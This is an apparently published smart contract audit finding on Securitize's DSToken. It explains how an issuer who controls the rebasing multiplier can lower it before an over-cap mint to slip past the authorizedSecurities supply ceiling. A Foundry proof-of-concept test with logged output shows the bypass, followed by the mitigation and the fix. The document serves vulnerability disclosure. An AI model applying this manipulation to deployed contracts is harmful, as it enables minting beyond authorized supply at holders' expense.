---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2-0-0-2
ingested_at: '2026-10-04T10:45:09Z'
protocol_category: []
published_at: '2026-09-07T00:00:00Z'
related_swc: []
severity: Low
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2.0.md
tags:
- firm:cyfrin
- report:2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2-0
title: '`DSToken::_issueUncapped` relies on `validateIssuance`, but its `authorizedSecurities`
  ceiling is measured against a multiplier-denominated `totalSupply` the issuance
  role controls'
vuln_class: []
---

# `DSToken::_issueUncapped` relies on `validateIssuance`, but its `authorizedSecurities` ceiling is measured against a multiplier-denominated `totalSupply` the issuance role controls

_Section severity (from Solodit section header): Low_  
_Audit firm: Cyfrin_  
_Source report: [2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2.0.md)_

---

**Description:** `DSToken::executeOverCapMint` calls `_issueUncapped`, which skips `_checkThrottle` entirely. The code states what is meant to remain in its place:

```solidity
/// @dev Mints tokens bypassing the cap check. Used by executeOverCapMint.
///      Compliance (validateIssuance) is still enforced — recipient status is
///      re-validated at execution time, not at schedule time.
```

The only limit on how much an executed overcap mint can create is the check inside `ComplianceService::validateIssuance`:

```solidity
uint256 totalSupply = getToken().totalSupply();
require(authorizedSecurities == 0 || totalSupply + _value <= authorizedSecurities,
    MAX_AUTHORIZED_SECURITIES_EXCEEDED);
```

`authorizedSecurities` is a fixed constant in token units, but `StandardToken::totalSupply` returns `convertSharesToTokens(tokenData.totalSupply)`, evaluated against the live `SecuritizeRebasingProvider::multiplier`. `setMultiplier` is `onlyIssuerOrAbove`, the same authority that schedules and executes exceptional mints. Lowering the multiplier by `K` immediately before execution makes `totalSupply` read `1 / K` of its real value, inflating the headroom the check measures against; the check is never re-evaluated when the multiplier is restored.

**Impact:** A compromised issuer can bypass the `authorizedSecurities` limit by manipulating the rebasing multiplier down prior to the overcap mint execution.

**Proof of Concept:** Requires `DSTokenLocalDeployment.sol` from the `SecuritizeRebasingProvider::setMultiplier` finding. Add the file below alongside it in `test/cyfrin-pocs/test/` and run with `forge test --match-test test_OverCapMintDefeatsAuthorizedSecurities -vv`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.22;

import {Test, console, Vm} from "forge-std/Test.sol";
import {DSTokenLocalDeployment} from "./DSTokenLocalDeployment.sol";

/// @notice The exceptional path skips the allowance by design, leaving `authorizedSecurities`
///         inside `validateIssuance` as the only quantitative limit on how much it can create.
contract OverCapAuthorizedSecuritiesTest is DSTokenLocalDeployment {
    /// @notice `_issueUncapped` skips `_checkThrottle` and documents `validateIssuance` as the
    ///         control that remains. The only quantitative limit in that check is
    ///         `authorizedSecurities`, compared against `StandardToken::totalSupply`, which is
    ///         itself denominated through the multiplier the same key controls.
    function test_OverCapMintDefeatsAuthorizedSecurities() public {
        ccs.setAuthorizedSecurities(AUTHORIZED_SECURITIES);
        token.setOverCapDelay(OVER_CAP_DELAY);

        assertEq(token.totalSupply(), HOLDER_BALANCE, "outstanding supply");
        console.log("authorized securities :", AUTHORIZED_SECURITIES);
        console.log("outstanding supply    :", token.totalSupply());
        console.log("scheduled over-cap    :", OVER_CAP_AMOUNT);

        uint256 snapshot = vm.snapshotState();

        // ---------------------------------------------------------------
        // Run 1: the ceiling does its job and the exceptional mint reverts
        // ---------------------------------------------------------------
        vm.prank(attacker);
        bytes32 opId = token.scheduleOverCapIssuance(attacker, OVER_CAP_AMOUNT, bytes32("subscription"));
        vm.warp(block.timestamp + OVER_CAP_DELAY);

        vm.prank(attacker);
        vm.expectRevert("Max authorized securities exceeded");
        token.executeOverCapMint(opId);
        console.log("run 1: execution reverts, ceiling enforced");

        // ---------------------------------------------------------------
        // Run 2: identical schedule, executed while the multiplier is lowered
        // ---------------------------------------------------------------
        vm.revertToState(snapshot);

        vm.prank(attacker);
        bytes32 opId2 = token.scheduleOverCapIssuance(attacker, OVER_CAP_AMOUNT, bytes32("subscription"));
        vm.warp(block.timestamp + OVER_CAP_DELAY);

        vm.prank(attacker);
        rebasing.setMultiplier(M_LOW);
        console.log("run 2: supply as the ceiling sees it :", token.totalSupply());

        vm.prank(attacker);
        token.executeOverCapMint(opId2);

        vm.prank(attacker);
        rebasing.setMultiplier(M0);

        console.log("run 2: supply after the multiplier is restored :", token.totalSupply());
        console.log("run 2: attacker balance :", token.balanceOf(attacker));

        // the same operation that reverted in run 1 has now executed
        assertGt(token.balanceOf(attacker), 0, "exceptional mint executed");
        assertEq(token.balanceOf(holder), HOLDER_BALANCE, "holder is unaffected");

        // and total supply now stands far above the ceiling the check exists to enforce
        assertGt(token.totalSupply(), AUTHORIZED_SECURITIES, "ceiling breached");
        assertGt(token.totalSupply(), AUTHORIZED_SECURITIES * 1000, "breached by orders of magnitude");
    }
}
```

```
authorized securities : 110000000000000
outstanding supply    : 100000000000000
scheduled over-cap    : 50000000000000
run 1: execution reverts, ceiling enforced
run 2: supply as the ceiling sees it : 100000000
run 2: supply after the multiplier is restored : 50000100000000000000
run 2: attacker balance : 50000000000000000000
```

**Recommended Mitigation:** Denominate `authorizedSecurities` in shares and compare it against `tokenData.totalSupply` directly, so the ceiling is independent of the multiplier. Gating `setMultiplier` on `onlyMaster` so that it inherits the master delay after handover also removes the manipulation, and is the single change that closes both this and the regular-path finding.

**Securitize:** Fixed in commit [67bd52a](https://github.com/securitize-io/dstoken/commit/67bd52a4389da12b321a7ede1c240fe98f644c82) by gating `setMultiplier` to `onlyMaster` instead of `onlyIssuerOrAbove` so a compromised issuer can't change the rebasing multiplier.

**Cyfrin:** Verified.

\clearpage
